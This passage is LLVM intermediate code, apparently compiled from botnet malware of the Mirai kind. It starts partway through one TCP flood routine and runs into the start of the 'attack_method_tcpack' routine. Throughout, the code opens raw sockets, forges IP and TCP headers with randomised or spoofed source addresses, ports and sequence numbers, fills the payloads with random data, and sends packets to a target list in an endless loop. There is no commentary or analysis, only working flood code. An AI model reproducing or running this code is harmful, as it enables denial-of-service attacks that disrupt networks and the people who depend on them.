  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 4, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1400, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 noundef zeroext %254) #8
  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 6, i8* %283, align 1
  br label %285

285:                                              ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108, !llvm.loop !19

288:                                              ; preds = %108
  br label %289

289:                                              ; preds = %436, %288
  store i32 0, i32* %9, align 4
  br label %290

290:                                              ; preds = %433, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %436

295:                                              ; preds = %290
  %296 = load i8**, i8*** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8*, i8** %296, i64 %298
  %300 = load i8*, i8** %299, align 8
  store i8* %300, i8** %30, align 8
  %301 = load i8*, i8** %30, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  store %struct.iphdr* %302, %struct.iphdr** %31, align 8
  %303 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i64 1
  %305 = bitcast %struct.iphdr* %304 to %struct.tcphdr*
  store %struct.tcphdr* %305, %struct.tcphdr** %32, align 8
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 2
  %311 = load i8, i8* %310, align 4
  %312 = zext i8 %311 to i32
  %313 = icmp slt i32 %312, 32
  br i1 %313, label %314, label %335

314:                                              ; preds = %295
  %315 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 1
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @ntohl(i32 noundef %320) #8
  %322 = call i32 @rand_next()
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 2
  %328 = load i8, i8* %327, align 4
  %329 = zext i8 %328 to i32
  %330 = lshr i32 %322, %329
  %331 = add i32 %321, %330
  %332 = call i32 @htonl(i32 noundef %331) #8
  %333 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 9
  store i32 %332, i32* %334, align 4
  br label %335

335:                                              ; preds = %314, %295
  %336 = load i32, i32* %26, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %342

338:                                              ; preds = %335
  %339 = call i32 @rand_next()
  %340 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  store i32 %339, i32* %341, align 4
  br label %342

342:                                              ; preds = %338, %335
  %343 = load i16, i16* %13, align 2
  %344 = zext i16 %343 to i32
  %345 = icmp eq i32 %344, 65535
  br i1 %345, label %346, label %352

346:                                              ; preds = %342
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 3
  store i16 %349, i16* %351, align 4
  br label %352

352:                                              ; preds = %346, %342
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  br i1 %355, label %356, label %362

356:                                              ; preds = %352
  %357 = call i32 @rand_next()
  %358 = and i32 %357, 65535
  %359 = trunc i32 %358 to i16
  %360 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  store i16 %359, i16* %361, align 4
  br label %362

362:                                              ; preds = %356, %352
  %363 = load i16, i16* %17, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %372

366:                                              ; preds = %362
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  br label %372

372:                                              ; preds = %366, %362
  %373 = load i32, i32* %18, align 4
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %379

375:                                              ; preds = %372
  %376 = call i32 @rand_next()
  %377 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 2
  store i32 %376, i32* %378, align 4
  br label %379

379:                                              ; preds = %375, %372
  %380 = load i32, i32* %19, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

382:                                              ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 3
  store i32 %383, i32* %385, align 4
  br label %386

386:                                              ; preds = %382, %379
  %387 = load i8, i8* %20, align 1
  %388 = icmp ne i8 %387, 0
  br i1 %388, label %389, label %395

389:                                              ; preds = %386
  %390 = call i32 @rand_next()
  %391 = and i32 %390, 65535
  %392 = trunc i32 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  br label %395

395:                                              ; preds = %389, %386
  %396 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* noundef %399, i32 noundef 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 6
  store i16 0, i16* %404, align 4
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = bitcast %struct.tcphdr* %406 to i8*
  %408 = call zeroext i16 @htons(i16 noundef zeroext 40) #8
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %405, i8* noundef %407, i16 noundef zeroext %408, i32 noundef 40)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %30, align 8
  %423 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %424 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i32 0, i32 0
  %429 = bitcast %struct.sockaddr_in* %428 to %struct.sockaddr*
  store %struct.sockaddr* %429, %struct.sockaddr** %423, align 8
  %430 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %431 = load %struct.sockaddr*, %struct.sockaddr** %430, align 8
  %432 = call i64 @sendto(i32 noundef %421, i8* noundef %422, i64 noundef 60, i32 noundef 16384, %struct.sockaddr* %431, i32 noundef 16)
  br label %433

433:                                              ; preds = %395
  %434 = load i32, i32* %9, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %9, align 4
  br label %290, !llvm.loop !20

436:                                              ; preds = %290
  br label %289

437:                                              ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpack(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 noundef %38, i64 noundef 8) #7
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 2, i32 noundef 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 3, i32 noundef 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 4, i32 noundef 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 5, i32 noundef 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 6, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 7, i32 noundef 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 17, i32 noundef 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 18, i32 noundef 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 noundef zeroext %71, %struct.attack_option* noundef %72, i8 noundef zeroext 11, i32 noundef 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 noundef zeroext %75, %struct.attack_option* noundef %76, i8 noundef zeroext 12, i32 noundef 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 13, i32 noundef 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 noundef zeroext %83, %struct.attack_option* noundef %84, i8 noundef zeroext 14, i32 noundef 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 noundef zeroext %87, %struct.attack_option* noundef %88, i8 noundef zeroext 15, i32 noundef 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 noundef zeroext %91, %struct.attack_option* noundef %92, i8 noundef zeroext 16, i32 noundef 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 noundef zeroext %95, %struct.attack_option* noundef %96, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 noundef zeroext %98, %struct.attack_option* noundef %99, i8 noundef zeroext 1, i32 noundef 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 noundef zeroext %102, %struct.attack_option* noundef %103, i8 noundef zeroext 25, i32 noundef %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

108:                                              ; preds = %4
  br label %440

109:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 noundef %110, i32 noundef 0, i32 noundef 3, i8* noundef %111, i32 noundef 4) #7
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

114:                                              ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 noundef %115)
  br label %440

117:                                              ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

118:                                              ; preds = %277, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %280

123:                                              ; preds = %118
  %124 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #7
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %26, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 40, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 noundef zeroext %157) #8
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 noundef zeroext %161) #8
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

170:                                              ; preds = %123
  %171 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

174:                                              ; preds = %170, %123
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 6, i8* %176, align 1
  %177 = load i32, i32* %28, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 noundef zeroext %188) #8
  %190 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 4
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 noundef zeroext %192) #8
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %18, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 noundef zeroext %197) #8
  %199 = zext i16 %198 to i32
  %200 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 2
  store i32 %199, i32* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -241
  %206 = or i16 %205, 80
  store i16 %206, i16* %203, align 4
  %207 = load i8, i8* %20, align 1
  %208 = sext i8 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %208, 1
  %213 = shl i16 %212, 13
  %214 = and i16 %211, -8193
  %215 = or i16 %214, %213
  store i16 %215, i16* %210, align 4
  %216 = load i8, i8* %21, align 1
  %217 = sext i8 %216 to i16
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %217, 1
  %222 = shl i16 %221, 12
  %223 = and i16 %220, -4097
  %224 = or i16 %223, %222
  store i16 %224, i16* %219, align 4
  %225 = load i8, i8* %22, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 11
  %232 = and i16 %229, -2049
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %23, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 10
  %241 = and i16 %238, -1025
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %24, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 9
  %250 = and i16 %247, -513
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %25, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 8
  %259 = and i16 %256, -257
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = call i32 @rand_next()
  %262 = and i32 %261, 65535
  %263 = trunc i32 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 5
  store i16 %263, i16* %265, align 2
  %266 = load i8, i8* %22, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %274

268:                                              ; preds = %174
  %269 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %271, -2049
  %273 = or i16 %272, 2048
  store i16 %273, i16* %270, align 4
  br label %274

274:                                              ; preds = %268, %174
  %275 = load i8*, i8** %31, align 8
  %276 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %275, i32 noundef %276)
  br label %277

277:                                              ; preds = %274
  %278 = load i32, i32* %9, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %9, align 4
  br label %118, !llvm.loop !21

280:                                              ; preds = %118
  br label %281

281:                                              ; preds = %439, %280
  store i32 0, i32* %9, align 4
  br label %282

282:                                              ; preds = %436, %281
  %283 = load i32, i32* %9, align 4
  %284 = load i8, i8* %5, align 1
